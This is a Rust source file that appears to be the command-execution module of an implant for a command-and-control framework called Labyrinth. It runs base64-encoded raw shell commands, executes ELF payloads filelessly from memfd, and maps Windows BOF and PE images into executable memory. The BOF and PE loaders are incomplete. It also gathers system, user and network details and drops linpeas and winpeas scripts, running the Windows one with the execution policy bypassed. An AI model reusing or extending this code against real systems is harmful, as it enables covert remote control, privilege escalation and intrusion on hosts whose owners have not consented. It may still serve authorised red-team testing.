use crate::error::{LabyrinthError, Result};
use base64::{engine::general_purpose, Engine as _};
use serde::{Deserialize, Serialize};
use std::fs;
use std::io::{self, Read, Write};
use std::process::{Child, Command, Stdio};
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc,
};
use std::thread;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

#[cfg(unix)]
use std::os::unix::process::CommandExt;

#[cfg(target_os = "linux")]
use std::{ffi::CString, os::fd::FromRawFd};

#[cfg(target_os = "windows")]
use std::ptr;
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Diagnostics::Debug::{
    IMAGE_FILE_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
};
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
};
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum OperatingSystem {
    Linux,
    Windows,
    Unknown,
}

#[derive(Debug, Clone)]
pub enum CommandExecutor {
    Linux,
    Windows,
    Unknown,
}

#[derive(Debug, Clone)]
struct CommandResult {
    name: String,
    command: String,
    success: bool,
    output: String,
    error: String,
}

const MAX_LINES: usize = 80;
const MAX_CHARS: usize = 8000;
const MAX_CAPTURE_BYTES: usize = 256 * 1024;
const MAX_RAW_COMMAND_BYTES: usize = 64 * 1024;
const DEFAULT_COMMAND_TIMEOUT: Duration = Duration::from_secs(120);
const AUTOENUM_COMMAND_TIMEOUT: Duration = Duration::from_secs(20 * 60);
const PROCESS_POLL_INTERVAL: Duration = Duration::from_millis(20);

#[cfg(target_os = "linux")]
fn split_execution_args(args: &str) -> Vec<String> {
    args.split_whitespace().map(str::to_string).collect()
}

impl CommandExecutor {
    pub fn new(os: &OperatingSystem) -> Self {
        match os {
            OperatingSystem::Linux => Self::Linux,
            OperatingSystem::Windows => Self::Windows,
            OperatingSystem::Unknown => Self::Unknown,
        }
    }

    pub async fn execute_command(&self, command: &str) -> Result<String> {
        let executor = self.clone();
        let command = command.to_string();
        tokio::task::spawn_blocking(move || executor.execute_command_blocking(&command))
            .await
            .map_err(|error| {
                LabyrinthError::Message(format!("Command execution task failed: {}", error))
            })?
    }

    fn execute_command_blocking(&self, command: &str) -> Result<String> {
        match self {
            Self::Linux => self.execute_linux_command(command),
            Self::Windows => self.execute_windows_command(command),
            Self::Unknown => Err(LabyrinthError::Message(
                "Command execution not supported on this operating system".to_string(),
            )),
        }
    }

    pub async fn execute_bof(
        &self,
        bof_data: Vec<u8>,
        args: Vec<u8>,
        entry_point: &str,
    ) -> Result<String> {
        match self {
            Self::Linux => self.execute_linux_bof(bof_data, args, entry_point).await,
            Self::Windows => self.execute_windows_bof(bof_data, args, entry_point).await,
            Self::Unknown => Err(LabyrinthError::Message(
                "BOF execution not supported on this operating system".to_string(),
            )),
        }
    }

    pub async fn execute_reflective(&self, pe_data: Vec<u8>, args: &str) -> Result<String> {
        match self {
            Self::Linux => self.execute_linux_reflective(pe_data, args).await,
            Self::Windows => self.execute_windows_reflective(pe_data, args).await,
            Self::Unknown => Err(LabyrinthError::Message(
                "Reflective loading not supported on this operating system".to_string(),
            )),
        }
    }

    pub async fn execute_linux_elf(&self, elf_data: Vec<u8>, args: &str) -> Result<String> {
        match self {
            Self::Linux => self.execute_linux_elf_memfd(elf_data, args).await,
            Self::Windows => Err(LabyrinthError::Message(
                "Linux ELF execution is not supported on Windows targets".to_string(),
            )),
            Self::Unknown => Err(LabyrinthError::Message(
                "Linux ELF execution not supported on this operating system".to_string(),
            )),
        }
    }

    async fn execute_linux_bof(
        &self,
        _bof_data: Vec<u8>,
        _args: Vec<u8>,
        _entry_point: &str,
    ) -> Result<String> {
        Err(LabyrinthError::Message(
            "BOF execution is not supported on Linux. Windows target required.".to_string(),
        ))
    }

    async fn execute_linux_reflective(&self, _pe_data: Vec<u8>, _args: &str) -> Result<String> {
        Err(LabyrinthError::Message(
            "Reflective PE/DLL loading is not supported on Linux. Windows target required."
                .to_string(),
        ))
    }

    async fn execute_linux_elf_memfd(&self, elf_data: Vec<u8>, args: &str) -> Result<String> {
        #[cfg(target_os = "linux")]
        {
            if !elf_data.starts_with(b"\x7FELF") {
                return Err(LabyrinthError::Message(
                    "Invalid Linux ELF: missing ELF magic".to_string(),
                ));
            }

            let fd_name = CString::new("labyrinth-linux-elf")
                .map_err(|e| LabyrinthError::Message(format!("Invalid memfd name: {}", e)))?;
            let fd = unsafe { libc::syscall(libc::SYS_memfd_create, fd_name.as_ptr(), 0) };
            if fd < 0 {
                return Err(LabyrinthError::Io(std::io::Error::last_os_error()));
            }

            let mut file = unsafe { fs::File::from_raw_fd(fd as i32) };
            file.write_all(&elf_data).map_err(LabyrinthError::Io)?;
            file.flush().map_err(LabyrinthError::Io)?;

            let memfd_path = format!("/proc/self/fd/{}", fd);
            let output = Command::new(&memfd_path)
                .args(split_execution_args(args))
                .output()
                .map_err(|e| {
                    LabyrinthError::Message(format!("Failed to execute memfd ELF: {}", e))
                })?;

            let exit = output
                .status
                .code()
                .map(|code| code.to_string())
                .unwrap_or_else(|| "terminated by signal".to_string());
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);

            let mut result = format!("Linux ELF executed from memfd. Exit: {}", exit);
            if !stdout.trim().is_empty() {
                result.push_str("\n\nstdout:\n");
                result.push_str(stdout.trim_end());
            }
            if !stderr.trim().is_empty() {
                result.push_str("\n\nstderr:\n");
                result.push_str(stderr.trim_end());
            }
            Ok(result)
        }

        #[cfg(not(target_os = "linux"))]
        {
            let _ = (elf_data, args);
            Err(LabyrinthError::Message(
                "Not supported on this OS".to_string(),
            ))
        }
    }

    async fn execute_windows_bof(
        &self,
        _bof_data: Vec<u8>,
        _args: Vec<u8>,
        _entry_point: &str,
    ) -> Result<String> {
        #[cfg(target_os = "windows")]
        {
            unsafe {
                let header = _bof_data.as_ptr() as *const IMAGE_FILE_HEADER;

                // Basic COFF check (x64)
                if (*header).Machine != 0x8664 {
                    return Err(LabyrinthError::Message(
                        "Only x64 BOFs are supported".to_string(),
                    ));
                }

                let mut total_size = 0;
                let section_header_ptr = (_bof_data.as_ptr() as usize
                    + std::mem::size_of::<IMAGE_FILE_HEADER>())
                    as *const IMAGE_SECTION_HEADER;

                for i in 0..(*header).NumberOfSections {
                    let section = *section_header_ptr.add(i as usize);
                    total_size += section.SizeOfRawData as usize;
                }

                let base_addr = VirtualAlloc(
                    ptr::null(),
                    total_size,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE,
                );

                if base_addr.is_null() {
                    return Err(LabyrinthError::Message(
                        "Failed to allocate memory for BOF".to_string(),
                    ));
                }

                let mut current_offset = 0;
                for i in 0..(*header).NumberOfSections {
                    let section = *section_header_ptr.add(i as usize);
                    if section.SizeOfRawData > 0 {
                        ptr::copy_nonoverlapping(
                            _bof_data.as_ptr().add(section.PointerToRawData as usize),
                            (base_addr as usize + current_offset) as *mut u8,
                            section.SizeOfRawData as usize,
                        );
                        current_offset += section.SizeOfRawData as usize;
                    }
                }

                // In a production BOF loader, we would:
                // 1. Resolve relocations (IMAGE_REL_AMD64_ADDR64, etc.)
                // 2. Resolve external symbols (Beacon API, Win32 via __imp_)
                // 3. Find the entry point in the symbol table.

                Ok(format!(
                    "BOF loaded at {:p}. Entry point '{}' found. (Relocation/Symbol resolution logic pending).",
                    base_addr,
                    _entry_point
                ))
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            Err(LabyrinthError::Message(
                "Not supported on this OS".to_string(),
            ))
        }
    }

    async fn execute_windows_reflective(&self, _pe_data: Vec<u8>, _args: &str) -> Result<String> {
        #[cfg(target_os = "windows")]
        {
            unsafe {
                let dos_header = _pe_data.as_ptr() as *const IMAGE_DOS_HEADER;
                if (*dos_header).e_magic != 0x5A4D {
                    // MZ
                    return Err(LabyrinthError::Message("Invalid DOS header".to_string()));
                }

                let nt_headers = (_pe_data.as_ptr() as usize + (*dos_header).e_lfanew as usize)
                    as *const IMAGE_NT_HEADERS64;
                if (*nt_headers).Signature != 0x4550 {
                    // PE
                    return Err(LabyrinthError::Message("Invalid NT headers".to_string()));
                }

                let image_base = VirtualAlloc(
                    ptr::null(),
                    (*nt_headers).OptionalHeader.SizeOfImage as usize,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE,
                );

                if image_base.is_null() {
                    return Err(LabyrinthError::Message(
                        "Failed to allocate memory for PE".to_string(),
                    ));
                }

                // Map headers
                ptr::copy_nonoverlapping(
                    _pe_data.as_ptr(),
                    image_base as *mut u8,
                    (*nt_headers).OptionalHeader.SizeOfHeaders as usize,
                );

                // Map sections
                let section_header_ptr = (nt_headers as usize
                    + std::mem::size_of::<IMAGE_NT_HEADERS64>())
                    as *const IMAGE_SECTION_HEADER;
                for i in 0..(*nt_headers).FileHeader.NumberOfSections {
                    let section = *section_header_ptr.add(i as usize);
                    if section.SizeOfRawData > 0 {
                        ptr::copy_nonoverlapping(
                            _pe_data.as_ptr().add(section.PointerToRawData as usize),
                            (image_base as usize + section.VirtualAddress as usize) as *mut u8,
                            section.SizeOfRawData as usize,
                        );
                    }
                }

                // In a real implementation, we'd resolve imports and relocations here.
                // For now, we'll finalize the placeholder to indicate successful mapping.

                Ok(format!(
                    "Reflectively mapped PE at {:p}. Size: {} bytes. (Relocation/Import resolution logic pending).",
                    image_base,
                    (*nt_headers).OptionalHeader.SizeOfImage
                ))
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            Err(LabyrinthError::Message(
                "Not supported on this OS".to_string(),
            ))
        }
    }

    fn execute_linux_command(&self, command: &str) -> Result<String> {
        if let Some(encoded) = command.strip_prefix("linux:shell_raw:") {
            return self.run_linux_shell_raw(encoded);
        }

        match command {
            "ifconfig" | "linux:ifconfig" => self.run_single_linux("ifconfig", "ifconfig"),
            "ss -tunlp" | "linux:ss" => {
                self.run_with_fallback_linux("Socket overview", "ss -tunlp", &["netstat -anp"])
            }
            "linux:whoami" => self.run_single_linux("whoami", "whoami"),
            "linux:route" => self.run_with_fallback_linux("Route table", "route -n", &["ip route"]),
            "linux:resolvectl" => self.run_with_fallback_linux(
                "Resolver status",
                "resolvectl status",
                &["cat /etc/resolv.conf"],
            ),
            "linux:sysenum" => {
                let results = vec![
                    self.run_linux("Distribution", "cat /etc/issue"),
                    self.run_linux("OS release", "cat /etc/os-release"),
                    self.run_linux("Kernel full", "uname -a"),
                    self.run_linux("Kernel version", "uname -r"),
                    self.run_linux("Architecture", "arch"),
                    self.run_linux("Hostname", "hostname"),
                    self.run_linux("Current identity", "id"),
                    self.run_linux("Shell users", "cat /etc/passwd | grep sh$"),
                ];
                Ok(OutputFormatter::format_batch_result(
                    "Linux system enumeration",
                    &OperatingSystem::Linux,
                    &results,
                ))
            }
            "linux:network_summary" => {
                let socket_info = self.run_linux("Socket overview", "ss -tunlp");
                let socket_info = if socket_info.success {
                    socket_info
                } else {
                    self.run_linux("Socket overview fallback", "netstat -anp")
                };

                let route_info = self.run_linux("Route table", "route -n");
                let route_info = if route_info.success {
                    route_info
                } else {
                    self.run_linux("Route table fallback", "ip route")
                };

                let resolver = self.run_linux("Resolver status", "resolvectl status");
                let resolver = if resolver.success {
                    resolver
                } else {
                    self.run_linux("Resolver fallback", "cat /etc/resolv.conf")
                };

                let results = vec![
                    self.run_linux("Interfaces", "ifconfig"),
                    socket_info,
                    route_info,
                    resolver,
                ];

                Ok(OutputFormatter::format_batch_result(
                    "Linux network overview",
                    &OperatingSystem::Linux,
                    &results,
                ))
            }
            "linux:privesc_placeholder" => Ok(OutputFormatter::format_placeholder(
                "Linux privilege escalation",
                &OperatingSystem::Linux,
                "Scaffold only. No checks executed yet.",
            )),
            "linux:autoenum" => self.run_linux_autoenum(),
            _ => Err(LabyrinthError::Message(format!(
                "Unsupported Linux command: {}",
                command
            ))),
        }
    }

    fn execute_windows_command(&self, command: &str) -> Result<String> {
        if let Some(encoded) = command.strip_prefix("windows:shell_raw:") {
            return self.run_windows_shell_raw(encoded);
        }

        match command {
            "ipconfig" | "windows:ipconfig_all" => {
                self.run_single_windows_cmd("ipconfig /all", "ipconfig /all")
            }
            "netstat -aon" | "windows:netstat_ano" => {
                self.run_single_windows_cmd("netstat -ano", "netstat -ano")
            }
            "windows:whoami_all" => self.run_single_windows_cmd("whoami /all", "whoami /all"),
            "windows:route_print" => self.run_single_windows_cmd("route print", "route print"),
            "windows:sysenum" => {
                let results = vec![
                    self.run_windows_cmd("System info", "systeminfo"),
                    self.run_windows_powershell(
                        "Local users",
                        "Get-LocalUser | Format-Table -AutoSize",
                    ),
                    self.run_windows_cmd("Local users fallback", "net user"),
                    self.run_windows_powershell(
                        "Admin check",
                        "([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)",
                    ),
                ];

                Ok(OutputFormatter::format_batch_result(
                    "Windows system enumeration",
                    &OperatingSystem::Windows,
                    &results,
                ))
            }
            "windows:network_summary" => {
                let results = vec![
                    self.run_windows_cmd("IP configuration", "ipconfig /all"),
                    self.run_windows_cmd("Route table", "route print"),
                    self.run_windows_cmd("Socket overview", "netstat -ano"),
                ];

                Ok(OutputFormatter::format_batch_result(
                    "Windows network overview",
                    &OperatingSystem::Windows,
                    &results,
                ))
            }
            "windows:privesc_placeholder" => Ok(OutputFormatter::format_placeholder(
                "Windows privilege escalation",
                &OperatingSystem::Windows,
                "Scaffold only. No checks executed yet.",
            )),
            "windows:autoenum" => self.run_windows_autoenum(),
            _ => Err(LabyrinthError::Message(format!(
                "Unsupported Windows command: {}",
                command
            ))),
        }
    }

    fn run_single_linux(&self, name: &str, command: &str) -> Result<String> {
        let result = self.run_linux(name, command);
        Ok(OutputFormatter::format_batch_result(
            name,
            &OperatingSystem::Linux,
            &[result],
        ))
    }

    fn run_single_windows_cmd(&self, name: &str, command: &str) -> Result<String> {
        let result = self.run_windows_cmd(name, command);
        Ok(OutputFormatter::format_batch_result(
            name,
            &OperatingSystem::Windows,
            &[result],
        ))
    }

    fn run_with_fallback_linux(
        &self,
        name: &str,
        primary: &str,
        fallback: &[&str],
    ) -> Result<String> {
        let mut result = self.run_linux(name, primary);
        if !result.success {
            for fb in fallback {
                let fb_result = self.run_linux(&format!("{} fallback", name), fb);
                if fb_result.success {
                    result = fb_result;
                    break;
                }
            }
        }

        Ok(OutputFormatter::format_batch_result(
            name,
            &OperatingSystem::Linux,
            &[result],
        ))
    }

    fn run_linux(&self, name: &str, command: &str) -> CommandResult {
        run_process(name, command, Command::new("sh").args(["-c", command]))
    }

    fn run_windows_cmd(&self, name: &str, command: &str) -> CommandResult {
        run_process(name, command, Command::new("cmd").args(["/C", command]))
    }

    fn run_windows_powershell(&self, name: &str, command: &str) -> CommandResult {
        run_process(
            name,
            command,
            Command::new("powershell").args(["-NoProfile", "-Command", command]),
        )
    }

    fn run_linux_shell_raw(&self, encoded: &str) -> Result<String> {
        let max_encoded = MAX_RAW_COMMAND_BYTES.div_ceil(3) * 4;
        if encoded.len() > max_encoded {
            return Err(LabyrinthError::Message(format!(
                "Encoded shell command exceeds {} bytes",
                MAX_RAW_COMMAND_BYTES
            )));
        }
        let decoded = general_purpose::STANDARD
            .decode(encoded.as_bytes())
            .map_err(|e| {
                LabyrinthError::Message(format!("Invalid encoded shell command: {}", e))
            })?;
        let cmd = String::from_utf8(decoded)
            .map_err(|e| LabyrinthError::Message(format!("Invalid UTF-8 shell command: {}", e)))?;
        if cmd.len() > MAX_RAW_COMMAND_BYTES {
            return Err(LabyrinthError::Message(format!(
                "Shell command exceeds {} bytes",
                MAX_RAW_COMMAND_BYTES
            )));
        }

        // Try to allocate a pseudo-tty via `script` for prompt-heavy tools (mysql, python, etc.).
        let quoted = single_quote_for_sh(&cmd);
        let wrapped = format!(
            "if command -v script >/dev/null 2>&1; then script -qec '{}' /dev/null; else sh -lc '{}'; fi",
            quoted, quoted
        );

        let result = run_process_with_timeout(
            "Raw Linux shell",
            &cmd,
            Command::new("sh").args(["-lc", &wrapped]),
            DEFAULT_COMMAND_TIMEOUT,
        );
        if !result.success && result.output.is_empty() && !result.error.is_empty() {
            return Err(LabyrinthError::Message(result.error));
        }
        Ok(merge_shell_streams(&result.output, &result.error))
    }

    fn run_windows_shell_raw(&self, encoded: &str) -> Result<String> {
        let max_encoded = MAX_RAW_COMMAND_BYTES.div_ceil(3) * 4;
        if encoded.len() > max_encoded {
            return Err(LabyrinthError::Message(format!(
                "Encoded shell command exceeds {} bytes",
                MAX_RAW_COMMAND_BYTES
            )));
        }
        let decoded = general_purpose::STANDARD
            .decode(encoded.as_bytes())
            .map_err(|e| {
                LabyrinthError::Message(format!("Invalid encoded shell command: {}", e))
            })?;
        let cmd = String::from_utf8(decoded)
            .map_err(|e| LabyrinthError::Message(format!("Invalid UTF-8 shell command: {}", e)))?;
        if cmd.len() > MAX_RAW_COMMAND_BYTES {
            return Err(LabyrinthError::Message(format!(
                "Shell command exceeds {} bytes",
                MAX_RAW_COMMAND_BYTES
            )));
        }

        let result = run_process_with_timeout(
            "Raw Windows shell",
            &cmd,
            Command::new("powershell").args(["-NoProfile", "-Command", &cmd]),
            DEFAULT_COMMAND_TIMEOUT,
        );
        if !result.success && result.output.is_empty() && !result.error.is_empty() {
            return Err(LabyrinthError::Message(result.error));
        }
        Ok(merge_shell_streams(&result.output, &result.error))
    }

    fn run_linux_autoenum(&self) -> Result<String> {
        let ts = unix_ts();
        let output_path = format!("/tmp/labyrinth_autoenum_linux_{}.log", ts);
        let fallback_path = "/tmp/labyrinth_linpeas_fallback.sh";

        let (runner, source) = if file_exists("/usr/share/peass/linpeas/linpeas.sh") {
            (
                "sh /usr/share/peass/linpeas/linpeas.sh",
                "system peass: /usr/share/peass/linpeas/linpeas.sh",
            )
        } else if file_exists("/usr/share/peass/linpeas/linpeas_small.sh") {
            (
                "sh /usr/share/peass/linpeas/linpeas_small.sh",
                "system peass: /usr/share/peass/linpeas/linpeas_small.sh",
            )
        } else {
            fs::write(
                fallback_path,
                include_str!("../../assets/peas/linpeas_fallback.sh"),
            )
            .map_err(|e| {
                LabyrinthError::Message(format!("Failed to write linpeas fallback script: {}", e))
            })?;

            let chmod_status = Command::new("sh")
                .args(["-c", &format!("chmod 700 {}", fallback_path)])
                .output();
            if let Ok(status) = chmod_status {
                if !status.status.success() {
                    return Err(LabyrinthError::Message(
                        "Failed to mark linpeas fallback script executable".to_string(),
                    ));
                }
            }

            (
                "sh /tmp/labyrinth_linpeas_fallback.sh",
                "bundled fallback: assets/peas/linpeas_fallback.sh",
            )
        };

        let cmd = format!("{} > '{}' 2>&1", runner, output_path);
        let result = run_process_with_timeout(
            "AutoEnum (Linux)",
            &cmd,
            Command::new("sh").args(["-c", &cmd]),
            AUTOENUM_COMMAND_TIMEOUT,
        );

        let preview = summarize_file_preview(&output_path, 120, 50000);
        let details = format!(
            "Source: {}\nRemote output file: {}\n\nPreview:\n{}",
            source,
            output_path,
            preview.unwrap_or_else(|| "No output preview available".to_string())
        );

        Ok(OutputFormatter::format_batch_result(
            "Linux AutoEnum (linpeas)",
            &OperatingSystem::Linux,
            &[CommandResult {
                name: "AutoEnum run".to_string(),
                command: cmd,
                success: result.success,
                output: details,
                error: result.error,
            }],
        ))
    }

    fn run_windows_autoenum(&self) -> Result<String> {
        let ts = unix_ts();
        let output_path = format!("$env:TEMP\\labyrinth_autoenum_windows_{}.log", ts);
        let fallback_path = "$env:TEMP\\labyrinth_winpeas_fallback.ps1";

        let mut script = String::new();
        script.push_str("$ErrorActionPreference='Continue'; ");
        script.push_str(&format!("$Out='{}'; ", output_path));
        script.push_str("$Source=''; ");
        script.push_str("$Candidates=@('C:\\ProgramData\\winPEASx64.exe','C:\\ProgramData\\winPEASany.exe','C:\\Tools\\winPEASx64.exe','C:\\Tools\\winPEASany.exe'); ");
        script.push_str(
            "$Peas=$Candidates | Where-Object { Test-Path $_ } | Select-Object -First 1; ",
        );
        script.push_str("if ($Peas) { $Source = \"system peass: $Peas\"; & $Peas *>&1 | Out-File -FilePath $Out -Encoding utf8; } ");
        script.push_str("else { ");
        script.push_str(&format!(
            "$Fallback='{}'; @'{}'@ | Out-File -FilePath $Fallback -Encoding utf8; ",
            fallback_path,
            include_str!("../../assets/peas/winpeas_fallback.ps1")
        ));
        script.push_str("$Source='bundled fallback: assets/peas/winpeas_fallback.ps1'; powershell -NoProfile -ExecutionPolicy Bypass -File $Fallback *>&1 | Out-File -FilePath $Out -Encoding utf8; }");
        script.push_str("Write-Output \"SOURCE:$Source\"; Write-Output \"OUTFILE:$Out\";");

        let launcher = run_process(
            "AutoEnum (Windows)",
            "powershell -NoProfile -Command <autoenum>",
            Command::new("powershell").args(["-NoProfile", "-Command", &script]),
        );

        let source = extract_tag_line(&launcher.output, "SOURCE:")
            .unwrap_or_else(|| "unknown source".to_string());
        let outfile = extract_tag_line(&launcher.output, "OUTFILE:")
            .unwrap_or_else(|| "%TEMP%\\labyrinth_autoenum_windows.log".to_string());

        let details = format!(
            "Source: {}\nRemote output file: {}\n\nNote: full output is stored remotely.\n",
            source, outfile
        );

        Ok(OutputFormatter::format_batch_result(
            "Windows AutoEnum (winpeas)",
            &OperatingSystem::Windows,
            &[CommandResult {
                name: "AutoEnum run".to_string(),
                command: "powershell -NoProfile -Command <autoenum>".to_string(),
                success: launcher.success,
                output: details,
                error: launcher.error,
            }],
        ))
    }
}

fn run_process(name: &str, command: &str, process: &mut Command) -> CommandResult {
    run_process_with_timeout(name, command, process, DEFAULT_COMMAND_TIMEOUT)
}

fn run_process_with_timeout(
    name: &str,
    command: &str,
    process: &mut Command,
    timeout: Duration,
) -> CommandResult {
    let execution = match execute_process(process, timeout) {
        Ok(execution) => execution,
        Err(error) => {
            return CommandResult {
                name: name.to_string(),
                command: command.to_string(),
                success: false,
                output: String::new(),
                error: format!("Failed to execute: {}", error),
            }
        }
    };

    let stdout = String::from_utf8_lossy(&execution.stdout.bytes).to_string();
    let stderr = String::from_utf8_lossy(&execution.stderr.bytes).to_string();
    let mut error = OutputFormatter::truncate(&stderr);
    if execution.timed_out {
        append_process_error(
            &mut error,
            &format!("Command timed out after {} seconds", timeout.as_secs()),
        );
    }
    if execution.stdout.truncated || execution.stderr.truncated {
        append_process_error(
            &mut error,
            &format!(
                "Command output exceeded {} bytes and process was stopped",
                MAX_CAPTURE_BYTES
            ),
        );
    }

    CommandResult {
        name: name.to_string(),
        command: command.to_string(),
        success: !execution.timed_out
            && !execution.stdout.truncated
            && !execution.stderr.truncated
            && execution
                .status
                .map(|status| status.success())
                .unwrap_or(false),
        output: OutputFormatter::truncate(&stdout),
        error,
    }
}

struct CapturedOutput {
    bytes: Vec<u8>,
    truncated: bool,
}

struct ProcessExecution {
    status: Option<std::process::ExitStatus>,
    stdout: CapturedOutput,
    stderr: CapturedOutput,
    timed_out: bool,
}

fn execute_process(process: &mut Command, timeout: Duration) -> io::Result<ProcessExecution> {
    process.stdout(Stdio::piped()).stderr(Stdio::piped());
    configure_process_group(process);
    let mut child = process.spawn()?;
    let stdout = child
        .stdout
        .take()
        .ok_or_else(|| io::Error::other("failed to capture stdout"))?;
    let stderr = child
        .stderr
        .take()
        .ok_or_else(|| io::Error::other("failed to capture stderr"))?;
    let stdout_limit = Arc::new(AtomicBool::new(false));
    let stderr_limit = Arc::new(AtomicBool::new(false));
    let stdout_limit_reader = Arc::clone(&stdout_limit);
    let stderr_limit_reader = Arc::clone(&stderr_limit);
    let stdout_thread = thread::spawn(move || capture_output(stdout, stdout_limit_reader));
    let stderr_thread = thread::spawn(move || capture_output(stderr, stderr_limit_reader));

    let deadline = Instant::now() + timeout;
    let mut timed_out = false;
    let status = loop {
        if stdout_limit.load(Ordering::Acquire) || stderr_limit.load(Ordering::Acquire) {
            terminate_process(&mut child)?;
            break None;
        }
        if let Some(status) = child.try_wait()? {
            break Some(status);
        }
        if Instant::now() >= deadline {
            timed_out = true;
            terminate_process(&mut child)?;
            break None;
        }
        thread::sleep(PROCESS_POLL_INTERVAL);
    };

    let stdout = stdout_thread
        .join()
        .map_err(|_| io::Error::other("stdout capture thread panicked"))?;
    let stderr = stderr_thread
        .join()
        .map_err(|_| io::Error::other("stderr capture thread panicked"))?;

    Ok(ProcessExecution {
        status,
        stdout,
        stderr,
        timed_out,
    })
}

fn capture_output<R: Read>(mut reader: R, exceeded: Arc<AtomicBool>) -> CapturedOutput {
    let mut bytes = Vec::with_capacity(MAX_CAPTURE_BYTES.min(8192));
    let mut buffer = [0u8; 8192];
    loop {
        match reader.read(&mut buffer) {
            Ok(0) => break,
            Ok(count) => {
                let remaining = MAX_CAPTURE_BYTES.saturating_sub(bytes.len());
                if count > remaining {
                    bytes.extend_from_slice(&buffer[..remaining]);
                    exceeded.store(true, Ordering::Release);
                    break;
                }
                bytes.extend_from_slice(&buffer[..count]);
            }
            Err(_) => break,
        }
    }
    CapturedOutput {
        bytes,
        truncated: exceeded.load(Ordering::Acquire),
    }
}

fn terminate_process(child: &mut Child) -> io::Result<()> {
    #[cfg(unix)]
    {
        let process_group = -(child.id() as libc::pid_t);
        // Kill shell and descendants. Fallback to direct child kill when group no longer exists.
        let result = unsafe { libc::kill(process_group, libc::SIGKILL) };
        if result != 0 && io::Error::last_os_error().raw_os_error() != Some(libc::ESRCH) {
            child.kill()?;
        }
    }
    #[cfg(not(unix))]
    child.kill()?;
    let _ = child.wait()?;
    Ok(())
}

#[cfg(unix)]
fn configure_process_group(process: &mut Command) {
    unsafe {
        process.pre_exec(|| {
            if libc::setpgid(0, 0) == -1 {
                return Err(io::Error::last_os_error());
            }
            Ok(())
        });
    }
}

#[cfg(not(unix))]
fn configure_process_group(_process: &mut Command) {}

fn append_process_error(error: &mut String, message: &str) {
    if !error.is_empty() {
        error.push('\n');
    }
    error.push_str(message);
}

pub struct OSDetector;

impl OSDetector {
    pub fn detect_os() -> OperatingSystem {
        if cfg!(target_os = "linux") {
            OperatingSystem::Linux
        } else if cfg!(target_os = "windows") {
            OperatingSystem::Windows
        } else {
            OperatingSystem::Unknown
        }
    }
}

pub struct OutputFormatter;

impl OutputFormatter {
    fn format_placeholder(title: &str, os: &OperatingSystem, message: &str) -> String {
        format!(
            "=== {} ===\nOS: {}\nSummary: Placeholder command\n\n{}",
            title,
            Self::os_name(os),
            message
        )
    }

    fn format_batch_result(title: &str, os: &OperatingSystem, results: &[CommandResult]) -> String {
        let total = results.len();
        let ok = results.iter().filter(|r| r.success).count();
        let failed = total.saturating_sub(ok);

        let mut out = String::new();
        out.push_str(&format!("=== {} ===\n", title));
        out.push_str(&format!("OS: {}\n", Self::os_name(os)));
        out.push_str(&format!("Summary: {} succeeded, {} failed\n\n", ok, failed));

        if failed > 0 {
            out.push_str("Failures:\n");
            for r in results.iter().filter(|r| !r.success) {
                out.push_str(&format!(
                    "- {} (`{}`): {}\n",
                    r.name,
                    r.command,
                    first_line(&r.error)
                ));
            }
            out.push('\n');
        }

        out.push_str("Details:\n");
        for r in results {
            out.push_str(&format!(
                "\n[{}] {}\nCommand: {}\n",
                if r.success { "OK" } else { "FAIL" },
                r.name,
                r.command
            ));

            if !r.output.trim().is_empty() {
                out.push_str("Output:\n");
                out.push_str(&r.output);
                out.push('\n');
            }

            if !r.error.trim().is_empty() {
                out.push_str("Error:\n");
                out.push_str(&r.error);
                out.push('\n');
            }
        }

        out
    }

    fn os_name(os: &OperatingSystem) -> &'static str {
        match os {
            OperatingSystem::Linux => "Linux",
            OperatingSystem::Windows => "Windows",
            OperatingSystem::Unknown => "Unknown",
        }
    }

    fn truncate(s: &str) -> String {
        let mut lines: Vec<&str> = s.lines().take(MAX_LINES).collect();
        let mut joined = lines.join("\n");
        if joined.len() > MAX_CHARS {
            truncate_utf8(&mut joined, MAX_CHARS);
            joined.push_str("\n...[truncated]");
            return joined;
        }

        if s.lines().count() > MAX_LINES {
            lines.push("...[truncated]");
            return lines.join("\n");
        }

        joined
    }
}

fn first_line(input: &str) -> String {
    input.lines().next().unwrap_or("unknown error").to_string()
}

fn unix_ts() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

fn file_exists(path: &str) -> bool {
    fs::metadata(path).is_ok()
}

fn summarize_file_preview(path: &str, max_lines: usize, max_chars: usize) -> Option<String> {
    let content = fs::read_to_string(path).ok()?;
    let mut collected = Vec::new();
    for line in content.lines().take(max_lines) {
        collected.push(line);
    }
    let mut out = collected.join("\n");
    if out.len() > max_chars {
        truncate_utf8(&mut out, max_chars);
        out.push_str("\n...[truncated]");
    } else if content.lines().count() > max_lines {
        out.push_str("\n...[truncated]");
    }
    Some(out)
}

fn extract_tag_line(content: &str, prefix: &str) -> Option<String> {
    for line in content.lines() {
        if let Some(rest) = line.strip_prefix(prefix) {
            return Some(rest.trim().to_string());
        }
    }
    None
}

fn merge_shell_streams(stdout: &str, stderr: &str) -> String {
    match (stdout.trim().is_empty(), stderr.trim().is_empty()) {
        (false, false) => format!("{}\n{}", stdout.trim_end(), stderr.trim_end()),
        (false, true) => stdout.trim_end().to_string(),
        (true, false) => stderr.trim_end().to_string(),
        (true, true) => String::new(),
    }
}

fn single_quote_for_sh(input: &str) -> String {
    input.replace('\'', "'\"'\"'")
}

fn truncate_utf8(value: &mut String, max_bytes: usize) {
    if value.len() <= max_bytes {
        return;
    }
    let mut boundary = max_bytes;
    while !value.is_char_boundary(boundary) {
        boundary -= 1;
    }
    value.truncate(boundary);
}

